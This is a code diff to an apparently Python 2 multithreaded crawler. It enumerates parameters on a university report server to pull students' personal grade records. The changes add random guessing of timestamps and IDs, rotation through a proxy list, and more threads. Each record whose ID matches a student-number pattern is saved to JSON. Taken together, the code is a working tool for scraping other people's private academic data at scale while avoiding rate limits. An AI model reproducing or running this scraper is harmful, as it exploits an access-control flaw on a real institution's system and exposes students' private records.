@@ -14,6 +14,7 @@ from random import randint as rand
 import urllib2, random
 import ConfigParser
 import io
+import traceback, sys
 
 
 config = r'''
@@ -30,10 +31,11 @@ saveAsName=none
 cachedId=A_5410
 
 [bool]
-get_all=false
+get_all=true
 
 [other]
 seed=97895
+use_proxy=true
 '''
 
 
@@ -46,6 +48,11 @@ conf = ConfigParser.RawConfigParser(allow_no_value=True)
 conf.readfp( io.BytesIO(config) )
 exitapp = False
 
+if conf.get('bool', 'get_all').lower() == 'true':
+  _file = './score.json'
+else:
+  _file = './score_grade.json'
+
 class Resp(object):
   def __init__(self, content):
     self.content = content
@@ -53,7 +60,7 @@ class Resp(object):
 with open('./proxy.lst') as fi:
   proxies = [_.rstrip('\n') for _ in fi]
 
-def download(ID, C_ID):
+def download(ID, C_ID, TIME):
   #url = ('http://bksjw.hust.edu.cn/reportServlet?action=18&file=student_personal_score_grade' +
   #'.raq&srcType=file&separator=%09&reportParamsId=' + str(ID)
   #+ '&saveAsName=&cachedId=A_5%d&t_i_m_e=%d' % (rand(300, 600), time.time() * 1000) )
@@ -73,7 +80,8 @@ def download(ID, C_ID):
       conf.get('param', 'saveAsName'),
       #rand(765, 766),
       C_ID,
-      time.time() * 1000,
+      #time.time() * 1000,
+      TIME,
       )
 
   headers = {
@@ -85,23 +93,33 @@ def download(ID, C_ID):
   #  print 'watting 1 min'
   #  time.sleep(60)
 
+  url = 'http://bksjw.hust.edu.cn:80/reportServlet?action=18&file=student_personal_score_grade.raq&srcType=file&separator=%09&reportParamsId=103997&saveAsName=%7Cu534E%7Cu4E2D%7Cu79D1%7Cu6280%7Cu5927%7Cu5B66%7Cu62A5%7Cu8868&cachedId=A_14870&t_i_m_e=1374721017793'
+
 
   opener = urllib2.build_opener( urllib2.ProxyHandler({'http': random.choice(proxies)}) )
   resp = Resp('nothing')
-  try:resp = Resp( opener.open(url, timeout = 5).read()  )
-  except:pass
+  try:
+    if conf.get('other', 'use_proxy').lower() == 'true':
+      resp = Resp( opener.open(url, timeout = 5).read()  )
+    else:
+      resp = Resp( urllib2.urlopen(url, timeout = 5).read()  )
+  except:
+    pass
 
   if '201110090' not in resp.content and 'script' not in resp.content:
     pat = r'''U([0-9]{9,9})'''
     ret = re.findall(pat, resp.content)
     if len(ret) > 0 and str(ret[0]) not in id_set and str(ret[0]) not in score_set:
-      print '\033[31mget %s' % (ret[0])
+      print '\033[31mget\n %s' % (ret[0])
       print '\033[32m %s' % resp.content
       score_set[ ret[0] ] = resp.content.decode('gbk')
+    else:
+      if ret:
+        print '\033[33m already get:%s' % (ret[0]),
 
 
 def update_id():
-  with open('./score_grade.json', 'r') as fi:
+  with open(_file, 'r') as fi:
     score = json.loads("["  +  fi.read().strip().strip(',').strip('\n').strip(',')  +  "]" )
     for s in score:
       for ss in s:
@@ -123,12 +141,12 @@ class Crawler(threading.Thread):
       task = queue.get()
       try:
         time.sleep(0.1)
-        download(task[0], task[1])
+        download(task[0], task[1], task[2])
         print '\033[32m %s' % str(task),
         if len(score_set) > 10:
           dictlock.acquire()
           try:
-            with open('./score_grade.json', 'aw') as fi:
+            with open(_file, 'aw') as fi:
               fi.write(",\n\n" + json.dumps(score_set, indent = 2))
               fi.flush()
               score_set.clear()
@@ -140,7 +158,7 @@ class Crawler(threading.Thread):
           print 'waiting 1 min'
           time.sleep(60)
         else:
-          print e
+          traceback.print_exc(file = sys.stdout)
       finally:
         self.queue.task_done()
 
@@ -161,11 +179,15 @@ class add_task(threading.Thread):
       rep_id_seed = int(c.get('rep', 'seed'))
       c_id_base = int(c.get('cid', 'base'))
       c_id_seed = int(c.get('cid', 'seed'))
+      TIME = c.get('time', 'base')
+      time_seed = int(c.get('time', 'seed'))
+      if TIME:
+        TIME = int(TIME)
+      else:
+        TIME = time.time() * 1000
       if queue.qsize() < 300:
         for i in xrange(1, 600, 1):
-          queue.put( (  rep_id_base + rand(-rep_id_seed, rep_id_seed) ,  c_id_base + rand(-c_id_seed,c_id_seed) ) )
-        c = ConfigParser.RawConfigParser(allow_no_value=True)
-        c.readfp(open('config.cfg'))
+          queue.put( (  rep_id_base + rand(-rep_id_seed, rep_id_seed) ,  c_id_base + rand(-c_id_seed,c_id_seed),  TIME + rand(-time_seed,  time_seed)) )
       time.sleep(6)
 
 
@@ -183,7 +205,7 @@ if __name__ == "__main__":
 
   crawlers = []
 
-  for i in xrange(5):
+  for i in xrange(15):
     crawler = Crawler(queue)
     crawler.setDaemon(True)
     crawlers.append(crawler)
@@ -193,7 +215,7 @@ if __name__ == "__main__":
   try:
     queue.join()
   except KeyboardInterrupt:
-    with open('./score_grade.json', 'aw') as fi:
+    with open(_file, 'aw') as fi:
       fi.write(",\n\n" + json.dumps(score_set, indent = 2))
       fi.flush()
       score_set.clear()
